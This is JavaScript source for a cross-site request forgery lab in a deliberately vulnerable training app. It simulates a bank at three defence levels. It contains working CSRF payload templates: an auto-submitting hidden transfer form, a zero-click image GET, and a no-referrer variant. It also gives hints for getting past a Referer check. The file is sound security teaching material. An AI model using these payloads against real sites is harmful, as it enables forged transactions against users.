/* Lab 03 — Cross-Site Request Forgery */
(function () {
  "use strict";
  var M = window.MVWA, $ = M.$, esc = M.escapeHtml;

  var BANK_ORIGIN = "https://bank.harbor.test";
  var SESSION_ID = "hb_8c1e44d09a7f";
  var CSRF_TOKEN = "f3b9c27a5e8d41c6b0a9e7d2";
  var START_BALANCE = 5000;
  var PAYEES = { jordan: "Jordan Lee", sam: "Sam Okafor", landlord: "Bayview Properties", mallory: "mallory (attacker)" };

  var TEMPLATES = {
    post:
      '<h1>Congratulations! You won a $500 gift card.</h1>\n' +
      '<p>Hold tight, we are confirming your prize…</p>\n\n' +
      '<form action="https://bank.harbor.test/transfer" method="POST">\n' +
      '  <input type="hidden" name="to" value="mallory">\n' +
      '  <input type="hidden" name="amount" value="1000">\n' +
      '</form>\n' +
      '<script>document.forms[0].submit()</script>',
    get:
      '<h1>Cute cat pictures</h1>\n' +
      '<!-- Loaded automatically. No click needed. -->\n' +
      '<img src="https://bank.harbor.test/transfer?to=mallory&amount=750" width="0" height="0">',
    noref:
      '<meta name="referrer" content="no-referrer">\n' +
      '<h1>Your parcel could not be delivered</h1>\n\n' +
      '<form action="https://bank.harbor.test/transfer" method="POST">\n' +
      '  <input type="hidden" name="to" value="mallory">\n' +
      '  <input type="hidden" name="amount" value="1500">\n' +
      '</form>\n' +
      '<script>document.forms[0].submit()</script>'
  };

  var state;
  function resetState() {
    state = {
      balance: START_BALANCE,
      tx: [
        { to: "Bayview Properties", amount: 1850, via: "bank.harbor.test" },
        { to: "Sam Okafor", amount: 40, via: "bank.harbor.test" }
      ]
    };
  }

  /* ---------------- rendering ---------------- */
  function money(n) { return "$" + n.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }

  function renderBank() {
    $("#balance").textContent = money(state.balance);
    $("#tx-body").innerHTML = state.tx.slice(0, 6).map(function (t) {
      var bad = t.via !== "bank.harbor.test";
      return "<tr><td>" + esc(t.to) + '</td><td class="mono">' + (bad ? '<span class="badge badge-danger">' + esc(t.via) + "</span>" : esc(t.via)) +
        '</td><td class="num">−' + esc(money(t.amount)) + "</td></tr>";
    }).join("");
    $("#csrf-token-view").textContent = CSRF_TOKEN;
  }

  /* ---------------- browser model ---------------- */
  // Cookie attributes for the session cookie at each level.
  function sameSite() { return M.getLevel() === "high" ? "Lax" : "None"; }

  // Decide whether the browser attaches the session cookie to a request.
  function cookieAttached(req) {
    if (!req.crossSite) return true;
    if (sameSite() === "None") return true;
    // Lax: only top-level navigations using a safe method.
    return req.topLevel && req.method === "GET";
  }

  // Referer per the default policy (strict-origin-when-cross-origin) or a <meta> override.
  function computeReferer(pageUrl, policy, crossSite) {
    if (policy === "no-referrer") return null;
    if (policy === "unsafe-url" || !crossSite) return pageUrl;
    try { return new URL(pageUrl).origin + "/"; } catch (e) { return null; }
  }

  /* ---------------- the bank's server ---------------- */
  function server(req) {
    var level = M.getLevel();
    var url;
    try { url = new URL(req.url); } catch (e) { return { status: 400, body: "Bad Request" }; }
    if (url.origin !== BANK_ORIGIN || url.pathname !== "/transfer") return { status: 404, body: "Not Found" };

    var params = {};
    url.searchParams.forEach(function (v, k) { params[k] = v; });
    Object.keys(req.body || {}).forEach(function (k) { params[k] = req.body[k]; });

    if (!req.cookies.session) return { status: 401, body: "Not signed in (no session cookie received)" };

    if (level !== "low" && req.method !== "POST") return { status: 405, body: "Method Not Allowed" };

    if (level === "medium") {
      var ref = req.headers.Referer;
      if (ref && ref.indexOf("bank.harbor.test") === -1) return { status: 403, body: "Cross-site request blocked (Referer check)" };
    }
    if (level === "high") {
      if (req.headers.Origin !== BANK_ORIGIN) return { status: 403, body: "Origin mismatch" };
      if (params.csrf_token !== CSRF_TOKEN) return { status: 403, body: "Invalid or missing CSRF token" };
    }

    var amount = Math.floor(Number(params.amount));
    var to = String(params.to || "");
    if (!PAYEES[to] || !(amount > 0)) return { status: 400, body: "Invalid payee or amount" };
    if (amount > state.balance) return { status: 422, body: "Insufficient funds" };

    state.balance -= amount;
    state.tx.unshift({ to: PAYEES[to], amount: amount, via: req.initiatorHost });
    renderBank();

    if (req.crossSite && to === "mallory") {
      M.complete("csrf-transfer");
      if (req.method === "GET") M.complete("csrf-get");
      if (level === "medium") M.complete("csrf-medium");
      M.toast("Forged transfer succeeded", money(amount) + " sent to mallory from Alex's account.", "danger");
    }
    return { status: 303, body: "See Other → /accounts (transfer of " + money(amount) + " to " + PAYEES[to] + " completed)" };
  }

  /* ---------------- dispatch + logging ---------------- */
  var logBlocks = [];
  function send(req) {
    req.cookies = cookieAttached(req) ? { session: SESSION_ID } : {};
    var res = server(req);
    logRequest(req, res);
    return res;
  }

  function logRequest(req, res) {
    var el = $("#req-log");
    var u = new URL(req.url);
    var lines = [];
    lines.push('<span class="meth">' + esc(req.method) + "</span> " + esc(u.pathname + u.search) + " HTTP/1.1");
    lines.push('<span class="hdr">Host: ' + esc(u.host) + "</span>");
    if (req.headers.Origin) lines.push('<span class="hdr">Origin: ' + esc(req.headers.Origin) + "</span>");
    lines.push('<span class="hdr">Referer: ' + (req.headers.Referer ? esc(req.headers.Referer) : "(none)") + "</span>");
    lines.push('<span class="hdr">Sec-Fetch-Site: ' + (req.crossSite ? "cross-site" : "same-origin") + "</span>");
    lines.push('<span class="hdr">Cookie: ' + (req.cookies.session ? "session=" + esc(req.cookies.session) : "(not sent: SameSite=" + sameSite() + ")") + "</span>");
    if (req.body && Object.keys(req.body).length) {
      lines.push("");
      lines.push(esc(new URLSearchParams(req.body).toString()));
    }
    var cls = res.status < 400 ? "s2" : "s4";
    lines.push("");
    lines.push('<span class="' + cls + '">← ' + res.status + "</span> " + esc(res.body));
    var block = '<span class="hdr"># ' + esc(new Date().toLocaleTimeString()) + " · initiated by " + esc(req.initiatorHost) + " (" + esc(req.initiator) + ")</span>\n" + lines.join("\n");
    logBlocks.unshift(block);          // newest first
    logBlocks = logBlocks.slice(0, 8);
    el.innerHTML = logBlocks.join('\n\n<span class="hdr">' + "─".repeat(32) + "</span>\n\n");
  }

  /* ---------------- legitimate transfer ---------------- */
  $("#transfer-form").addEventListener("submit", function (e) {
    e.preventDefault();
    var body = { to: $("#t-to").value, amount: $("#t-amount").value };
    if (M.getLevel() === "high") body.csrf_token = CSRF_TOKEN;
    send({
      method: "POST", url: BANK_ORIGIN + "/transfer", body: body,
      headers: { Origin: BANK_ORIGIN, Referer: BANK_ORIGIN + "/accounts" },
      crossSite: false, topLevel: true, initiator: "form", initiatorHost: "bank.harbor.test"
    });
  });

  /* ---------------- attacker page ---------------- */
  function visitAttackerPage() {
    var pageUrl = $("#evil-url").value.trim();
    var pageOrigin, host;
    try { var pu = new URL(pageUrl); pageOrigin = pu.origin; host = pu.host; }
    catch (e) { M.toast("Invalid URL", "Enter a full attacker page URL, e.g. https://prizes.attacker.test/claim", "warn"); return; }
    if (pageOrigin === BANK_ORIGIN) {
      M.toast("That's the bank", "The attacker cannot host pages on bank.harbor.test itself.", "warn");
      return;
    }
    var doc = new DOMParser().parseFromString($("#evil-html").value, "text/html");
    var meta = doc.querySelector('meta[name="referrer" i]');
    var policy = meta ? (meta.getAttribute("content") || "").trim().toLowerCase() : "";
    var referer = computeReferer(pageUrl, policy, true);
    var sent = 0;

    function headers() { var h = { Origin: pageOrigin }; if (referer) h.Referer = referer; return h; }

    Array.prototype.forEach.call(doc.querySelectorAll("form"), function (form) {
      var action = form.getAttribute("action") || pageUrl;
      var method = (form.getAttribute("method") || "GET").toUpperCase() === "POST" ? "POST" : "GET";
      var data = {};
      Array.prototype.forEach.call(form.querySelectorAll("input[name], select[name], textarea[name]"), function (inp) {
        var tag = inp.tagName.toLowerCase(), type = (inp.getAttribute("type") || "").toLowerCase();
        if (tag === "input" && /^(submit|button|reset|image|file)$/.test(type)) return;
        if (tag === "input" && /^(checkbox|radio)$/.test(type) && !inp.hasAttribute("checked")) return;
        var value;
        if (tag === "select") {
          var opt = inp.querySelector("option[selected]") || inp.querySelector("option");
          value = opt ? (opt.hasAttribute("value") ? opt.getAttribute("value") : opt.textContent.trim()) : "";
        } else if (tag === "textarea") {
          value = inp.textContent;
        } else {
          value = inp.getAttribute("value") || "";
        }
        data[inp.getAttribute("name")] = value;
      });
      var abs;
      try { abs = new URL(action, pageUrl); } catch (e) { return; }
      var req = { method: method, headers: headers(), crossSite: true, topLevel: true, initiator: "form submission", initiatorHost: host };
      if (method === "GET") {
        Object.keys(data).forEach(function (k) { abs.searchParams.set(k, data[k]); });
        req.url = abs.toString(); req.body = {};
        delete req.headers.Origin; // browsers omit Origin on top-level GET navigations
      } else {
        req.url = abs.toString(); req.body = data;
      }
      send(req); sent++;
    });

    Array.prototype.forEach.call(doc.querySelectorAll("img[src], iframe[src], script[src], link[href]"), function (el) {
      var src = el.getAttribute("src") || el.getAttribute("href");
      var abs;
      try { abs = new URL(src, pageUrl); } catch (e) { return; }
      if (abs.origin !== BANK_ORIGIN) return;
      var h = headers(); delete h.Origin;
      send({
        method: "GET", url: abs.toString(), body: {}, headers: h, crossSite: true,
        topLevel: false, initiator: el.tagName.toLowerCase() + " element", initiatorHost: host
      });
      sent++;
    });

    if (!sent) M.toast("Nothing happened", "The page made no requests to bank.harbor.test. Add a form or an image pointing at /transfer.", "warn");
  }

  $("#evil-visit").addEventListener("click", visitAttackerPage);
  $("#evil-url").addEventListener("input", function () {
    var v = $("#evil-url").value;
    var bar = $("#evil-url-bar");
    try { var u = new URL(v); bar.innerHTML = esc(u.protocol + "//") + "<b>" + esc(u.host) + "</b>" + esc(u.pathname + u.search); }
    catch (e) { bar.textContent = v; }
  });
  $("#evil-template").addEventListener("change", function (e) {
    var t = TEMPLATES[e.target.value];
    if (t) $("#evil-html").value = t;
    e.target.value = "";
  });
  $("#reset-bank").addEventListener("click", function () {
    resetState(); renderBank();
    logBlocks = [];
    $("#req-log").innerHTML = '<span class="hdr"># No requests yet.</span>';
    M.toast("Account reset", "Balance restored to " + money(START_BALANCE) + ".");
  });

  resetState();
  $("#evil-html").value = TEMPLATES.post;
  renderBank();

  M.initLab({
    id: "csrf",
    levels: {
      low: "The session cookie is SameSite=None and the /transfer endpoint accepts GET or POST with no other checks.",
      medium: "Only POST is accepted, and requests whose Referer doesn't contain “bank.harbor.test” are rejected. A missing Referer is allowed.",
      high: "The session cookie is SameSite=Lax, a per-session CSRF token is required and the Origin header must match exactly."
    },
    hints: [
      '<details class="hint"><summary>Hint: first forged transfer</summary><div><p>The example payload is ready to go. Click <em>Victim opens this page</em> and watch the bank\'s request log.</p></div></details>',
      '<details class="hint"><summary>Hint: zero-click GET</summary><div><p>On Low the endpoint reads parameters from the query string too. Load the <em>Zero-click GET</em> example: an <code>&lt;img&gt;</code> tag is enough.</p></div></details>',
      '<details class="hint"><summary>Hint: beating the Referer check</summary><div><p>By default, browsers send only the origin on cross-site requests, so the host name is what the check sees. Register a host such as <code>bank.harbor.test.attacker.test</code>, or remove the header entirely with <code>&lt;meta name="referrer" content="no-referrer"&gt;</code>.</p></div></details>'
    ].join("")
  });
})();
